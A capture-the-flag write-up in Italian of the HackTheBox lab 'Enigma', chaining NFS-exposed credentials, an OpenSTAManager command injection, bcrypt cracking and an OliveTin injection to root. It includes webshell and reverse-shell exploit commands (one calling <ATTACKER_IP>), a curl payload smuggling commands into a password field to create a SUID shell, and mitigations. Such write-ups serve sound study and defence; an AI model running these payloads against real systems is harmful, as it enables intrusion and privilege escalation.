```txt
 ______       _                       
|  ____|     (_)                      
| |__   _ __  _  __ _ _ __ ___   __ _ 
|  __| | '_ \| |/ _` | '_ ` _ \ / _` |
| |____| | | | | (_| | | | | | | (_| |
|______|_| |_|_|\__, |_| |_| |_|\__,_|
                 __/ |                
                |___/                 
===============================================================================

----[ 0x00 ]  DISCLAIMER
-------------------------------------------------------------------------------
Questo documento è esclusivamente a scopo educativo in ambiente di laboratorio
(HTB). Non riprodurre tecniche o procedure su sistemi non autorizzati.

----[ 0x01 ]  ABSTRACT
-------------------------------------------------------------------------------
Target:   Enigma (HTB / lab) — enigma.htb
Autore:   Francesco Caligiuri
Lingua:   IT

Sommario: una share NFS di onboarding, leggibile da chiunque, contiene un PDF
con credenziali iniziali. Tra i virtual host c'è un'istanza OpenSTAManager
vulnerabile a command injection autenticata nell'import delle fatture
elettroniche (CVE-2025-69212) → webshell come `www-data`. Dalla config PHP si
ottengono le credenziali MySQL e gli hash bcrypt degli utenti; quello di
`haris` si cracca e dà l'utente locale. L'escalation sfrutta OliveTin, in
ascolto su localhost come root, senza autenticazione e con un'azione che
interpola un argomento di tipo `password` (non validato) in un comando shell.

----[ 0x02 ]  THREAT MODEL & SCOPE
-------------------------------------------------------------------------------
Attore:    Attaccante di rete con accesso ai servizi esposti.
Assunti:   Nessuna credenziale iniziale.
Obiettivo: Ottenere root sul sistema e leggere /root/root.txt.
Esclusioni: Persistence, lateral movement, data exfil oltre la flag.

----[ 0x03 ]  ENUMERAZIONE INIZIALE
-------------------------------------------------------------------------------
Port scan:
    nmap -p- --min-rate 5000 enigma.htb
    nmap -p 22,80,110,111,143,993,995,2049 -sV enigma.htb

Risultati rilevanti:
    22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu (PasswordAuthentication no)
    80/tcp   open  http      nginx 1.24.0 (Ubuntu)
    110,143,993,995/tcp      Dovecot (pop3/imap)
    111/tcp  open  rpcbind
    2049/tcp open  nfs

Virtual host su nginx:
    enigma.htb              → sito statico
    mail001.enigma.htb      → Roundcube
    support_001.enigma.htb  → OpenSTAManager

----[ 0x04 ]  NFS ONBOARDING
-------------------------------------------------------------------------------
    showmount -e enigma.htb
    /srv/nfs/onboarding *

    sudo mount -t nfs -o vers=3,nolock enigma.htb:/srv/nfs/onboarding /mnt/onboarding
    ls -la /mnt/onboarding
    New_Employee_Access.pdf

Il PDF contiene le credenziali iniziali di un dipendente:
    kevin : Enigma2024!

La password di onboarding è condivisa: vale sulla webmail (mail001)
anche per sarah, non solo per kevin.

----[ 0x05 ]  ANALISI APPLICAZIONE E SUPERFICIE DI ATTACCO
-------------------------------------------------------------------------------
support_001 espone OpenSTAManager <= 2.9.8. Il plugin di import delle
fatture elettroniche (importFE_ZIP) estrae un archivio ZIP e, per i file
.p7m firmati, chiama XML::decodeP7M():

    exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', ...);

`$file` è il nome del file dentro lo ZIP: tra virgolette doppie ma mai
passato a escapeshellarg().

Le credenziali del portale stanno nella posta. Le stesse credenziali di
onboarding (Enigma2024!) aprono anche la casella di sarah su Roundcube:

    http://mail001.enigma.htb   →  sarah : Enigma2024!

Nella sua inbox c'è una mail che le comunica l'accesso a OpenSTAManager:
    admin : Ne3s4rtars78s

----[ 0x06 ]  VULNERABILITÀ (ROOT CAUSE) — FOOTHOLD
-------------------------------------------------------------------------------
- Il nome di un file contenuto nello ZIP caricato è controllato dall'utente.
- Viene concatenato in una stringa passata a exec() senza escaping.
- Un nome che chiude le virgolette inietta comandi arbitrari.
- Serve solo un utente con accesso all'import fatture.

In breve: **filename controllato** + **exec() senza escapeshellarg()** ⇒
**RCE autenticata come www-data** (CVE-2025-69212).

----[ 0x07 ]  EXPLOIT — CVE-2025-69212
-------------------------------------------------------------------------------
PoC: github.com/BridgerAlderson/CVE-2025-69212

    python3 exploit.py -t http://support_001.enigma.htb -u admin -p 'Ne3s4rtars78s' --check
    python3 exploit.py -t http://support_001.enigma.htb -u admin -p 'Ne3s4rtars78s' --webshell

Webshell in /var/www/html/openstamanager/files/:
    http://support_001.enigma.htb/files/SHELL.php?c=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Reverse shell e TTY:
    python3 exploit.py -t http://support_001.enigma.htb -u admin -p 'Ne3s4rtars78s' \
        --reverse-shell <ATTACKER_IP> 4444
    python3 -c 'import pty; pty.spawn("/bin/bash")'

----[ 0x08 ]  CREDENZIALI (CONFIG & DB)
-------------------------------------------------------------------------------
/var/www/html/openstamanager/config.inc.php:
    $db_username = 'brollin';
    $db_password = 'Fri3nds@9099';
    $db_name     = 'openstamanager';

    mysql -u brollin -p'Fri3nds@9099' -h 127.0.0.1 openstamanager
    SELECT id, username, password FROM zz_users;

    1  admin  $2y$10$B9lW6duK45fkgWqOmBMQQeEn/ybYru1PlFStemjq4fKUk1FBCsaCW
    2  haris  $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC

Crack del bcrypt di haris:
    hashcat -m 3200 haris.hash rockyou.txt
    → bestfriends

----[ 0x09 ]  POST-EXPLOIT (USER FLAG)
-------------------------------------------------------------------------------
SSH accetta solo chiavi, quindi si passa da www-data con su:
    su - haris          # password: bestfriends
    cat /home/haris/user.txt
    [REDACTED]

Nota: su può impiegare qualche secondo (pam_unix / NSS lento).

----[ 0x0A ]  PIVOT PRIVILEGI — OLIVETIN
-------------------------------------------------------------------------------
Enumerazione: nessuna regola sudo per haris, nessun SUID custom. Porte su
loopback:
    ss -tlnp
    127.0.0.1:1337   OliveTin
    127.0.0.1:3306   MySQL

OliveTin è un pannello web che esegue comandi shell predefiniti:
- binario /usr/local/bin/OliveTin, config /etc/OliveTin/config.yaml
- unit systemd senza `User=` → gira come **root**
- API REST: POST /api/StartAction, /api/StartActionAndWait

Config rilevante:
    authRequireGuestsToLogin: false
    defaultPermissions:
      exec: true

    - title: Backup Database
      id: backup_database
      shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
      arguments:
        - name: db_user
          type: ascii_identifier
        - name: db_pass
          type: password
        - name: db_name
          type: ascii_identifier

----[ 0x0B ]  VULNERABILITÀ (ROOT CAUSE) — PRIVESC
-------------------------------------------------------------------------------
- Gli argomenti di tipo `password` non vengono validati: il controllo di tipo
  ritorna subito senza errori.
- Il template Go sostituisce il testo senza alcun escaping shell.
- Il comando risultante viene eseguito con sh -c dal processo OliveTin (root).
- Gli utenti guest non devono autenticarsi e hanno permesso exec su tutto.

In breve: **argomento non validato** + **template senza escaping** +
**servizio root senza autenticazione** ⇒ **command injection come root**.

----[ 0x0C ]  ESCALATION: INIEZIONE IN DB_PASS
-------------------------------------------------------------------------------
    curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \
      -H 'Content-Type: application/json' \
      -d '{
        "actionId": "backup_database",
        "arguments": [
          {"name": "db_user", "value": "backup_svc"},
          {"name": "db_pass", "value": "x'\''; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; echo __OT_DONE__ #"},
          {"name": "db_name", "value": "production"}
        ]
      }'

Comando effettivamente eseguito da root:
    mysqldump -u backup_svc -p'x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; echo __OT_DONE__ #' production > /opt/backups/backup.sql

- `-p'x'` chiude l'apice
- `;` separa i comandi
- `#` commenta il resto della riga

Root shell:
    /tmp/rootbash -p
    id
    uid=1000(haris) gid=1000(haris) euid=0(root) groups=1000(haris),100(users)
    cat /root/root.txt
    [REDACTED]

----[ 0x0D ]  CATENA D’ATTACCO (TIMELINE)
-------------------------------------------------------------------------------
1. Recon → mail, NFS, tre vhost su nginx
2. NFS onboarding → PDF con credenziali iniziali
3. Password riusata → casella di sarah → mail con credenziali admin OSM
4. OpenSTAManager → CVE-2025-69212 → webshell come www-data
5. config.inc.php → MySQL → hash bcrypt in zz_users
6. Crack del bcrypt di haris → su - haris → user flag
7. Porte loopback → OliveTin come root, guest con exec
8. Injection nell'argomento db_pass → bash SUID
9. rootbash -p → root flag

----[ 0x0E ]  MITIGAZIONI
-------------------------------------------------------------------------------
- NFS:
  * Non esportare documenti con credenziali; limitare l'export per IP
- OpenSTAManager:
  * Aggiornare oltre 2.9.8; usare escapeshellarg() sui path in decodeP7M()
- Credenziali:
  * Non riusare password tra DB, applicazioni e account di sistema
  * Password di onboarding uniche per utente e da cambiare al primo accesso
  * Non inviare credenziali in chiaro via mail
- OliveTin:
  * Eseguire come utente dedicato non privilegiato (User= nella unit)
  * Abilitare l'autenticazione e togliere exec ai guest
  * Non interpolare argomenti `password` in comandi shell

----[ 0x0F ]  IOCs / ARTEFATTI (LAB)
-------------------------------------------------------------------------------
- Mount NFS di /srv/nfs/onboarding da IP esterno
- ZIP con nomi .p7m anomali caricati in importFE_ZIP
- /var/www/html/openstamanager/files/SHELL.php
- POST a 127.0.0.1:1337/api/StartActionAndWait con db_pass contenente ';'
- /tmp/rootbash con bit SUID

----[ 0x10 ]  APPENDICE — PIANO B NON USATO
-------------------------------------------------------------------------------
linpeas segnalava anche snap-confine (set-capabilities, 2.75.2+ubuntu24.04)
vulnerabile a CVE-2026-8933: race su /tmp/snap.rootfs_XXXXXX con apertura
O_CREAT|O_TRUNC senza O_NOFOLLOW → symlink attack. Non necessario: OliveTin
dava root più in fretta.

----[ 0x11 ]  SOMMARIO (TL;DR)
-------------------------------------------------------------------------------
- NFS world-readable → PDF con credenziali
- Password riusata → mail di sarah → credenziali admin OpenSTAManager
- OpenSTAManager 2.9.8 → CVE-2025-69212 → www-data
- config PHP → MySQL → bcrypt di haris craccato → user
- OliveTin root senza auth → injection in db_pass → bash SUID → root

Rooted.

----[ 0x12 ]  RIFERIMENTI & CREDITI
-------------------------------------------------------------------------------
- CVE-2025-69212 — OpenSTAManager <= 2.9.8, command injection in decodeP7M()
  (PoC: BridgerAlderson/CVE-2025-69212)
- OliveTin — command injection via argomenti `password` non validati
- CVE-2026-8933 — snap-confine (alternativa non usata)
- Autore: Francesco Caligiuri

===============================================================================
 .: Knowledge, Skillz, Root :.                      .: Stay curious! :.
===============================================================================
```
